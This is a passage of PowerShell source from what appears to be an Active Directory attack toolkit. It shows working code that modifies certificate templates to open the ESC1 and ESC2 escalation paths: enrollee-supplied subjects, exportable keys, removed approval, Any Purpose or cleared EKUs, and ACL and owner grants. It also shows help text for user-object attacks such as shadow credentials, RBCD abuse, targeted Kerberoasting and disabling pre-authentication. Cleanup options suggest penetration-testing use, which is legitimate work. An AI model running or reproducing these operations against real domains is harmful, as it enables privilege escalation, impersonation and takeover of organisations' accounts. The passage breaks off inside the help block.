                    Write-Log "[Set-CertificateTemplate] New msPKI-Certificate-Name-Flag: $NewFlags (0x$($NewFlags.ToString('X'))) - All other flags cleared (ENROLLEE_SUPPLIES_SUBJECT is exclusive)"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Certificate-Name-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Enabled ENROLLEE_SUPPLIES_SUBJECT (cleared all other subject name flags)"
                }
            }

            if ($AllowExportableKey) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Enable EXPORTABLE_KEY flag") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Setting EXPORTABLE_KEY flag"

                    # Get current flag value (raw integer from Get-CertificateTemplate -Raw)
                    $CurrentFlags = if ($TemplateInfo.'msPKI-Private-Key-Flag') {
                        [int]$TemplateInfo.'msPKI-Private-Key-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Private-Key-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    $NewFlags = $CurrentFlags -bor 0x00000010  # EXPORTABLE_KEY
                    Write-Log "[Set-CertificateTemplate] New msPKI-Private-Key-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Private-Key-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Enabled EXPORTABLE_KEY"
                }
            }

            if ($RemoveManagerApproval) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Remove manager approval requirement") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Removing PEND_ALL_REQUESTS flag"

                    # Get current flag value (raw integer from Get-CertificateTemplate -Raw)
                    $CurrentFlags = if ($TemplateInfo.'msPKI-Enrollment-Flag') {
                        [int]$TemplateInfo.'msPKI-Enrollment-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Enrollment-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    $NewFlags = $CurrentFlags -band (-bnot 0x00000002)  # Remove PEND_ALL_REQUESTS
                    Write-Log "[Set-CertificateTemplate] New msPKI-Enrollment-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Enrollment-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Removed manager approval requirement"
                }
            }

            # ===== Cleanup/Revert Parameters (reverse of ESC1 attack) =====
            if ($DisableEnrolleeSuppliesSubject) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Disable ENROLLEE_SUPPLIES_SUBJECT flag") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Removing ENROLLEE_SUPPLIES_SUBJECT flag"

                    $CurrentFlags = if ($TemplateInfo.'msPKI-Certificate-Name-Flag') {
                        [int]$TemplateInfo.'msPKI-Certificate-Name-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Certificate-Name-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    # Remove ENROLLEE_SUPPLIES_SUBJECT (0x1) and restore typical defaults:
                    # SUBJECT_ALT_REQUIRE_UPN (0x02000000) + SUBJECT_ALT_REQUIRE_EMAIL (0x04000000) + SUBJECT_REQUIRE_DIRECTORY_PATH (0x80000000)
                    # This is the typical setting for User templates
                    $NewFlags = $CurrentFlags -band (-bnot 0x00000001)  # Remove ENROLLEE_SUPPLIES_SUBJECT
                    if ($NewFlags -eq 0) {
                        # If clearing ENROLLEE_SUPPLIES_SUBJECT leaves flags at 0, set reasonable defaults
                        # SUBJECT_ALT_REQUIRE_UPN = 0x02000000 (CA supplies UPN from AD)
                        $NewFlags = 0x02000000
                        Write-Log "[Set-CertificateTemplate] Setting default: SUBJECT_ALT_REQUIRE_UPN"
                    }
                    Write-Log "[Set-CertificateTemplate] New msPKI-Certificate-Name-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Certificate-Name-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Disabled ENROLLEE_SUPPLIES_SUBJECT (restored CA-supplied subject)"
                }
            }

            if ($AddManagerApproval) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add manager approval requirement") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding PEND_ALL_REQUESTS flag"

                    $CurrentFlags = if ($TemplateInfo.'msPKI-Enrollment-Flag') {
                        [int]$TemplateInfo.'msPKI-Enrollment-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Enrollment-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    $NewFlags = $CurrentFlags -bor 0x00000002  # Add PEND_ALL_REQUESTS
                    Write-Log "[Set-CertificateTemplate] New msPKI-Enrollment-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Enrollment-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Added manager approval requirement"
                }
            }

            # EKU Modifications
            if ($AddClientAuthentication) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add Client Authentication EKU") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding Client Authentication EKU"

                    # Client Authentication OID: 1.3.6.1.5.5.7.3.2
                    $ClientAuthOID = "1.3.6.1.5.5.7.3.2"

                    # Get current EKU values (multi-value attribute from Get-CertificateTemplate -Raw)
                    # Handle both single-value (string) and multi-value (array) cases
                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            # Multi-value: flatten to string array
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            # Single-value: wrap in array
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -notcontains $ClientAuthOID) {
                        # Build new array with proper flattening
                        $NewEKU = [string[]]@($CurrentEKU + $ClientAuthOID)
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
                        $Modifications += "Added Client Authentication EKU"
                    } else {
                        Write-Log "[Set-CertificateTemplate] Client Authentication EKU already present"
                        $Modifications += "Client Authentication EKU already present (no change)"
                    }
                }
            }

            # ===== Additional EKU Manipulation Parameters =====

            # RemoveEKU - Remove specific EKU OID
            if ($RemoveEKU) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Remove EKU: $RemoveEKU") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Removing EKU: $RemoveEKU"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -contains $RemoveEKU) {
                        $NewEKU = [string[]]@($CurrentEKU | Where-Object { $_ -ne $RemoveEKU })
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        if ($NewEKU.Count -gt 0) {
                            $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
                        }
                        else {
                            # Clear the attribute if no EKUs remain
                            $null = Set-DomainObject -Identity $TemplateDN -Clear @('pKIExtendedKeyUsage') -SearchBase $TemplatesBase
                        }
                        $Modifications += "Removed EKU: $RemoveEKU"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] EKU $RemoveEKU not present in template"
                        $Modifications += "EKU $RemoveEKU not present (no change)"
                    }
                }
            }

            # AddAnyPurposeEKU - Add Any Purpose EKU (ESC2)
            if ($AddAnyPurposeEKU) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add Any Purpose EKU (ESC2)") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding Any Purpose EKU"

                    $AnyPurposeOID = "2.5.29.37.0"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -notcontains $AnyPurposeOID) {
                        $NewEKU = [string[]]@($CurrentEKU + $AnyPurposeOID)
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
                        $Modifications += "Added Any Purpose EKU (2.5.29.37.0) - ESC2"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] Any Purpose EKU already present"
                        $Modifications += "Any Purpose EKU already present (no change)"
                    }
                }
            }

            # ClearEKUs - Remove ALL EKUs (ESC2 variant - no EKUs = any purpose)
            if ($ClearEKUs) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Clear all EKUs (ESC2 variant)") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Clearing all EKUs"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    if ($CurrentEKU.Count -gt 0) {
                        Write-Log "[Set-CertificateTemplate] Removing $($CurrentEKU.Count) EKU(s): $($CurrentEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Clear @('pKIExtendedKeyUsage') -SearchBase $TemplatesBase
                        $Modifications += "Cleared all EKUs ($($CurrentEKU.Count) removed) - ESC2 variant"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] No EKUs to clear"
                        $Modifications += "No EKUs present (no change)"
                    }
                }
            }

            # AddSmartcardLogon - Add Smartcard Logon EKU for PKINIT
            if ($AddSmartcardLogon) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add Smartcard Logon EKU") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding Smartcard Logon EKU"

                    $SmartcardLogonOID = "1.3.6.1.4.1.311.20.2.2"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -notcontains $SmartcardLogonOID) {
                        $NewEKU = [string[]]@($CurrentEKU + $SmartcardLogonOID)
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
                        $Modifications += "Added Smartcard Logon EKU (1.3.6.1.4.1.311.20.2.2) for PKINIT"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] Smartcard Logon EKU already present"
                        $Modifications += "Smartcard Logon EKU already present (no change)"
                    }
                }
            }

            # Increment revision FIRST before ACL modifications
            # Certificate templates require revision increment for ANY change, this must be done BEFORE ACL modifications to avoid constraint violations
            if ($GrantEnrollment -or $GrantFullControl -or $GrantWrite -or $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll) {
                Write-Log "[Set-CertificateTemplate] Incrementing revision before ACL modifications"

                $CurrentRevision = if ($TemplateInfo.revision) {
                    [int]$TemplateInfo.revision
                } else { 0 }

                $NewRevision = $CurrentRevision + 1
                Write-Log "[Set-CertificateTemplate] Revision: $CurrentRevision -> $NewRevision"

                $null = Set-DomainObject -Identity $TemplateDN -Set @{'revision' = $NewRevision} -SearchBase $TemplatesBase
                Write-Log "[Set-CertificateTemplate] Successfully incremented revision to $NewRevision"
            }

            # ACL Modifications
            if ($GrantEnrollment -or $GrantFullControl -or $GrantWrite -or $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll) {
                Write-Log "[Set-CertificateTemplate] Processing ACL modifications"

                if ($GrantEnrollment) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant Certificate-Enrollment to $GrantEnrollment") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting Certificate-Enrollment to $GrantEnrollment"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                        -GrantACE `
                                                        -Principal $GrantEnrollment `
                                                        -ExtendedRight 'CertEnroll' `
                                                        -SearchBase $TemplatesBase `
                                                        -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted Certificate-Enrollment to $GrantEnrollment"
                                Write-Log "[Set-CertificateTemplate] Successfully granted Certificate-Enrollment to $GrantEnrollment"
                            }
                            else {
                                # Set-DomainObject returned false (commit failed)
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                Write-Warning "[Set-CertificateTemplate] Try using LDAPS (-UseLDAPS) or use certutil.exe for ACL modifications"
                                $Modifications += "Failed to grant Certificate-Enrollment (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant Certificate-Enrollment: $_"
                            Write-Warning "[Set-CertificateTemplate] Certificate template ACL modifications via LDAP may require LDAPS"
                            $Modifications += "Failed to grant Certificate-Enrollment to $GrantEnrollment"
                        }
                    }
                }

                if ($GrantFullControl) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant Full Control to $GrantFullControl") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting Full Control to $GrantFullControl"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -GrantACE `
                                                       -Principal $GrantFullControl `
                                                       -Rights 'GenericAll' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted Full Control to $GrantFullControl"
                                Write-Log "[Set-CertificateTemplate] Successfully granted Full Control to $GrantFullControl"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to grant Full Control (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant Full Control: $_"
                            $Modifications += "Failed to grant Full Control to $GrantFullControl"
                        }
                    }
                }

                if ($GrantWrite) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant WriteProperty to $GrantWrite") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting WriteProperty to $GrantWrite"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -GrantACE `
                                                       -Principal $GrantWrite `
                                                       -Rights 'WriteProperty' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted WriteProperty to $GrantWrite"
                                Write-Log "[Set-CertificateTemplate] Successfully granted WriteProperty to $GrantWrite"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to grant WriteProperty (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant WriteProperty: $_"
                            $Modifications += "Failed to grant WriteProperty to $GrantWrite"
                        }
                    }
                }

                if ($RevokeEnrollment) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Revoke Certificate-Enrollment from $RevokeEnrollment") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Revoking Certificate-Enrollment from $RevokeEnrollment"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -RevokeACE `
                                                       -Principal $RevokeEnrollment `
                                                       -ExtendedRight 'CertEnroll' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Revoked Certificate-Enrollment from $RevokeEnrollment"
                                Write-Log "[Set-CertificateTemplate] Successfully revoked Certificate-Enrollment from $RevokeEnrollment"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to revoke Certificate-Enrollment (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to revoke Certificate-Enrollment: $_"
                            $Modifications += "Failed to revoke Certificate-Enrollment from $RevokeEnrollment"
                        }
                    }
                }

                # SetOwner - Change template owner
                if ($SetOwner) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Set Owner to $SetOwner") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Setting owner to $SetOwner"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -SetOwner `
                                                       -Principal $SetOwner `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Changed owner to $SetOwner"
                                Write-Log "[Set-CertificateTemplate] Successfully changed owner to $SetOwner"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] Owner modification failed - this may require TakeOwnership permission"
                                $Modifications += "Failed to change owner (insufficient permissions)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to change owner: $_"
                            $Modifications += "Failed to change owner to $SetOwner"
                        }
                    }
                }

                # GrantAutoEnroll - Grant Certificate-AutoEnrollment extended right
                if ($GrantAutoEnroll) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant Certificate-AutoEnrollment to $GrantAutoEnroll") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting Certificate-AutoEnrollment to $GrantAutoEnroll"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -GrantACE `
                                                       -Principal $GrantAutoEnroll `
                                                       -ExtendedRight 'CertAutoEnroll' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted Certificate-AutoEnrollment to $GrantAutoEnroll"
                                Write-Log "[Set-CertificateTemplate] Successfully granted Certificate-AutoEnrollment to $GrantAutoEnroll"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to grant Certificate-AutoEnrollment (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant Certificate-AutoEnrollment: $_"
                            $Modifications += "Failed to grant Certificate-AutoEnrollment to $GrantAutoEnroll"
                        }
                    }
                }
            }

            # Increment revision attribute (for non-ACL modifications)
            # Certificate templates require revision to be incremented on ANY modification
            # This is an AD CS constraint - without it, commits will fail
            $ACLModificationsMade = ($GrantEnrollment -or $GrantFullControl -or $GrantWrite -or $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll)

            if ($Modifications.Count -gt 0 -and -not $ACLModificationsMade) {
                Write-Log "[Set-CertificateTemplate] Incrementing template revision (non-ACL modifications)"

                $CurrentRevision = if ($TemplateInfo.revision) {
                    [int]$TemplateInfo.revision
                } else { 0 }

                $NewRevision = $CurrentRevision + 1
                Write-Log "[Set-CertificateTemplate] Revision: $CurrentRevision -> $NewRevision"

                $null = Set-DomainObject -Identity $TemplateDN -Set @{'revision' = $NewRevision} -SearchBase $TemplatesBase
                Write-Log "[Set-CertificateTemplate] Successfully incremented revision to $NewRevision"
            }

            # Success - Show modification summary and call Get-CertificateTemplate for output
            Show-Line "Template modified successfully: $TemplateName" -Class Hint
            Show-Line "Modifications applied: $($Modifications -join ', ')"

            # Use Get-CertificateTemplate to display the updated template
            Get-CertificateTemplate -Identity $Identity -ShowAll

        } catch {
            $ErrorMessage = $_.Exception.Message

            # Permission errors: show warning and re-throw so callers (e.g. Request-ADCSCertificate) can abort early
            if ($ErrorMessage -match "Insufficient permissions to modify template") {
                Write-Warning "[!] $ErrorMessage"
                throw
            }

            # Determine error type and show appropriate message (using centralized Show-Error)
            if ($ErrorMessage -match "Access is denied|Insufficient rights|UnauthorizedAccessException") {
                Show-Error -Type Permission -Message "modify template" -Target $Identity -Reason $ErrorMessage
            }
            elseif ($ErrorMessage -match "not found|does not exist") {
                Show-Error -Type NotFound -Message "Certificate template" -Target $Identity
            }
            else {
                Show-Error -Type Operation -Message "Failed to modify template" -Target $Identity -Reason $ErrorMessage
            }

            return $null
        }
    }

    end {
        Write-Log "[Set-CertificateTemplate] Template modification complete"
    }
}



# ----- Set-DomainUser.ps1 -----

function Set-DomainUser {
<#
.SYNOPSIS
    Modifies user objects in Active Directory.

.DESCRIPTION
    Set-DomainUser is a flexible helper function for creating and modifying user objects in AD.
    All operations use ModifyRequest via $Script:LdapConnection. Password operations use
    unicodePwd (ModifyRequest) with DirectoryEntry (ADSI) fallback.
    It supports various operations via parameter sets:
    - Password Reset (unicodePwd ModifyRequest, ADSI fallback)
    - Password Change (unicodePwd Delete+Add, ADSI fallback)
    - Owner modification (requires TakeOwnership permission)
    - ACL modification (requires WriteDacl permission)
    - RBCD configuration (requires WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity)
    - Shadow Credentials (adds/removes Key Credentials for PKINIT authentication)
    - UAC Flag Manipulation (DontReqPreauth, PasswordNotRequired, PasswordNeverExpires, PasswordCantChange,
      ReversibleEncryption, SmartcardRequired, NotDelegated, PasswordExpired - each with Set/Clear)

.PARAMETER Identity
    sAMAccountName, DistinguishedName, SID or DOMAIN\user format (for modifying existing users).

.PARAMETER NewPassword
    New password to set. If used alone, performs password reset.
    If used with -OldPassword, performs password change.

.PARAMETER OldPassword
    Old password (required for password change operation).

.PARAMETER Owner
    New owner for the user object (DOMAIN\user or DN format).

.PARAMETER GrantRights
    Rights to grant to a principal. Values: GenericAll, GenericWrite, ResetPassword, WriteDacl, WriteOwner.

.PARAMETER Principal
    Principal for ACL or RBCD operations.
    With -GrantRights: Principal to grant rights to (required).
    With -ClearRBCD: Specific principal to remove from RBCD (optional, lists entries if not specified).

.PARAMETER AddRBCD
    Computer account to allow delegation FROM (for RBCD on service accounts with SPN).
    This principal will be allowed to impersonate users TO the target service account.
    Sets msDS-AllowedToActOnBehalfOfOtherIdentity on the target.

.PARAMETER ClearRBCD
    Removes RBCD configuration (clears msDS-AllowedToActOnBehalfOfOtherIdentity).
    If multiple principals are configured, use -Principal to remove a specific one.
    Use -Force to remove all principals at once.

.PARAMETER AddShadowCredential
    Adds a Shadow Credential (Key Credential) to the user object for PKINIT authentication.

.PARAMETER ClearShadowCredentials
    Removes all Shadow Credentials from the user object.

.PARAMETER DeviceID
    Device GUID for Shadow Credential operations.
    With -AddShadowCredential: Optional custom Device ID (random GUID if not specified).
    With -ClearShadowCredentials: Specific DeviceID to remove (required if multiple credentials exist).

.PARAMETER NoPassword
    With -AddShadowCredential: Export the PFX certificate without password protection.

.PARAMETER SetSPN
    Add a Service Principal Name to the user account.
    Enables Targeted Kerberoasting - the user can then be Kerberoasted.
    Example: -SetSPN "HTTP/fakeservice.contoso.com"

.PARAMETER ClearSPN
    Remove a specific SPN from the user account.
    Used for cleanup after Targeted Kerberoasting.
    Use -Force to remove ALL SPNs.

.PARAMETER DontReqPreauth
    Set the DONT_REQ_PREAUTH flag on a user account (UAC 0x400000).
    Disables Kerberos pre-authentication, making the account AS-REP roastable.

.PARAMETER ClearDontReqPreauth
    Remove the DONT_REQ_PREAUTH flag from a user account (UAC 0x400000).
    Re-enables Kerberos pre-authentication (cleanup).

.PARAMETER Enable
    Enable a disabled user account (remove ACCOUNTDISABLE flag).

.PARAMETER Disable
    Disable a user account (set ACCOUNTDISABLE flag).

.PARAMETER Unlock
    Unlock a locked-out user account (clear lockoutTime attribute).

.PARAMETER PasswordNotRequired
    Set the PASSWD_NOTREQD flag on a user account (UAC 0x0020).
    Allows the account to have an empty password.

.PARAMETER ClearPasswordNotRequired
    Remove the PASSWD_NOTREQD flag from a user account (UAC 0x0020).
    Requires a password again (cleanup).

.PARAMETER PasswordCantChange
    Set the PASSWD_CANT_CHANGE flag on a user account (UAC 0x0040).
    Prevents the user from changing their own password.

.PARAMETER ClearPasswordCantChange
    Remove the PASSWD_CANT_CHANGE flag from a user account (UAC 0x0040).
    Allows the user to change their password again (cleanup).

.PARAMETER ReversibleEncryption
    Set the ENCRYPTED_TEXT_PWD_ALLOWED flag on a user account (UAC 0x0080).
    Stores the password using reversible encryption.

.PARAMETER ClearReversibleEncryption
    Remove the ENCRYPTED_TEXT_PWD_ALLOWED flag from a user account (UAC 0x0080).
    Disables reversible encryption (cleanup).

.PARAMETER PasswordNeverExpires
    Set the DONT_EXPIRE_PASSWORD flag on a user account (UAC 0x10000).
    Password will never expire regardless of domain policy.

.PARAMETER ClearPasswordNeverExpires
    Remove the DONT_EXPIRE_PASSWORD flag from a user account (UAC 0x10000).
    Password expiry follows domain policy again (cleanup).

.PARAMETER SmartcardRequired
    Set the SMARTCARD_REQUIRED flag on a user account (UAC 0x40000).
    Requires smartcard for interactive logon.

.PARAMETER ClearSmartcardRequired
    Remove the SMARTCARD_REQUIRED flag from a user account (UAC 0x40000).
    No longer requires smartcard for logon (cleanup).

.PARAMETER NotDelegated
    Set the NOT_DELEGATED flag on a user account (UAC 0x100000).
    Prevents the account from being delegated (sensitive account).

.PARAMETER ClearNotDelegated
    Remove the NOT_DELEGATED flag from a user account (UAC 0x100000).
    Allows the account to be delegated again (cleanup).

.PARAMETER PasswordExpired
    Force password expiry on a user account (set pwdLastSet to 0).
    User must change password at next logon.

.PARAMETER ClearPasswordExpired
    Clear the PASSWORD_EXPIRED flag from a user account (UAC 0x800000).
    Removes forced password change requirement (cleanup).

.PARAMETER PassThru
    Returns a result object instead of only console output.
    Useful for scripting and automation.

.PARAMETER Domain
    Target domain.

.PARAMETER Server
    Specific Domain Controller.

.PARAMETER Credential
    PSCredential object for authentication.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -NewPassword "NewPass123!"
    Resets password (requires Reset-Password permission).

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -OldPassword "OldPass" -NewPassword "NewPass123!"
    Changes password (requires old password).

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -Owner "DOMAIN\attacker"
    Takes ownership of user object.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -GrantRights GenericAll -Principal "DOMAIN\attacker"
    Grants GenericAll rights to attacker.

.EXAMPLE
    Set-DomainUser -Identity "serviceuser" -AddRBCD "DOMAIN\evilcomputer$"
    Configures RBCD: evilcomputer$ can now impersonate users TO serviceuser.

.EXAMPLE
    Set-DomainUser -Identity "serviceuser" -ClearRBCD
    Removes RBCD configuration from service account (if only one principal configured).

.EXAMPLE
    Set-DomainUser -Identity "serviceuser" -ClearRBCD -Principal "EVILCOMPUTER$"
    Removes specific principal from RBCD configuration.

.EXAMPLE
    Set-DomainUser -Identity "serviceuser" -ClearRBCD -Force
    Removes all principals from RBCD configuration.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -AddShadowCredential
    Adds a Shadow Credential to the user. Returns certificate for PKINIT authentication.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearShadowCredentials
    Removes all Shadow Credentials from the user.

.EXAMPLE
    Set-DomainUser -Identity "serviceaccount" -SetSPN "HTTP/fakeservice.contoso.com"
    Adds SPN to enable Targeted Kerberoasting.

.EXAMPLE
    Set-DomainUser -Identity "serviceaccount" -ClearSPN "HTTP/fakeservice.contoso.com"
    Removes specific SPN from account.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -DontReqPreauth
    Disables Kerberos pre-authentication to enable ASREPRoasting.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearDontReqPreauth
    Re-enables Kerberos pre-authentication (cleanup).

.EXAMPLE
    Set-DomainUser -Identity "hiddenuser" -Enable
    Enables a disabled user account.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -Disable
    Disables a user account.

.EXAMPLE
    Set-DomainUser -Identity "lockeduser" -Unlock
    Unlocks a locked-out user account.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -PasswordNotRequired
    Sets the PASSWD_NOTREQD flag, allowing an empty password.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearPasswordNotRequired
    Removes the PASSWD_NOTREQD flag (cleanup).

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -PasswordNeverExpires
    Sets the DONT_EXPIRE_PASSWORD flag so the password never expires.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearPasswordNeverExpires
    Removes the DONT_EXPIRE_PASSWORD flag (cleanup).

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ReversibleEncryption
